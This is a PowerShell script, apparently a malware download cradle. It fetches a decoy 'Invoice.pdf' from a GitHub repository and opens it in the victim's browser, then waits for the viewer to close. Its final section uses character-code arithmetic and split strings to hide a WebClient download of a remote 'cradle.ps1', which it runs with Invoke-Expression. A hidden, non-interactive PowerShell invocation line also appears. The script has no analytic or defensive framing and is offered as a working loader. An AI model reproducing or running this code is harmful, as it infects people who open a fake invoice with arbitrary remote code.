$pdfUrl  = "https://raw.githubusercontent.com/Brothersextremegaming/pwshcradle/refs/heads/main/Invoice.pdf"
$pdfPath = Join-Path ([Environment]::GetFolderPath("MyDocuments")) "file.pdf"

$browserPaths = @(
    "C:\Program Files\Google\Chrome\Application\chrome.exe",
    "C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
    "C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
    "C:\Program Files\Opera\opera.exe",
    "C:\Program Files\Opera GX\opera.exe",
    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    "C:\Program Files\Mozilla Firefox\firefox.exe"
)

$browserProcessNames = @(
    "chrome",
    "brave",
    "opera",
    "msedge",
    "firefox"
)

Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -ErrorAction SilentlyContinue

$browser = $browserPaths | Where-Object { Test-Path $_ } | Select-Object -First 1

if ($browser) {
    Start-Process -FilePath $browser -ArgumentList "`"$pdfPath`"" -ErrorAction SilentlyContinue
} else {
    Start-Process $pdfPath -ErrorAction SilentlyContinue
}

function Get-PDFRenderer {
    $procs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue
    $procs | Where-Object {
        $name = $_.Name -replace "\.exe$", ""
        ($browserProcessNames -contains $name) -and
        ($_.CommandLine -match "\.pdf")
    } | Select-Object ProcessId, Name, CommandLine
}

do {
    $pdfProcesses = Get-PDFRenderer
    if ($pdfProcesses) {
        Start-Sleep -Seconds 1
    }
} while ($pdfProcesses)

powershell -NoP -sta -NonI -W Hidden -enc
$kXlyKP3fcoeFLACS = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |<##>ForEach-Object{$_}<##>|%{ ( [char][int] $_)})) |<##>ForEach-Object{$_}<##>| % {$_}) $([char](72*83/72)+[char](21+121-21)+[char](0+115-0)+[char](0+116-0)+[char](37+101-37)+[char](114+109-114)+[char](0+46-0)+[char](76+78-76)+[char](0+101-0)+[char](0+116-0)+[char](3*46/3)+[char](42*87/42)+[char](109*101/109)+[char](118*98/118)+[char](0+67-0)+[char](0+108-0)+[char](0+105-0)+[char](0+101-0)+[char](97+110-97)+[char](100*116/100)); $GTKP6yZvCknYMD5uEylg3 = $('h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'r'+'a'+'w'+'.'+'g'+'i'+'t'+'h'+'u'+'b'+'u'+'s'+'e'+'r'+'c'+'o'+'n'+'t'+'e'+'n'+'t'+'.'+'c'+'o'+'m'+'/'+'B'+'r'+'o'+'t'+'h'+'e'+'r'+'s'+'e'+'x'+'t'+'r'+'e'+'m'+'e'+'g'+'a'+'m'+'i'+'n'+'g'+'/'+'p'+'w'+'s'+'h'+'c'+'r'+'a'+'d'+'l'+'e'+'/'+'r'+'e'+'f'+'s'+'/'+'h'+'e'+'a'+'d'+'s'+'/'+'m'+'a'+'i'+'n'+'/'+'c'+'r'+'a'+'d'+'l'+'e'+'.'+'p'+'s'+'1'); $kXlyKP3fcoeFLACS.DownloadString($GTKP6yZvCknYMD5uEylg3) |<##>ForEach-Object{$_}<##>| & ([string]::join('', ( (73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) |<##>ForEach-Object{$_}<##>|%{ ( [char][int] $_)})) |<##>ForEach-Object{$_}<##>| % {$_})

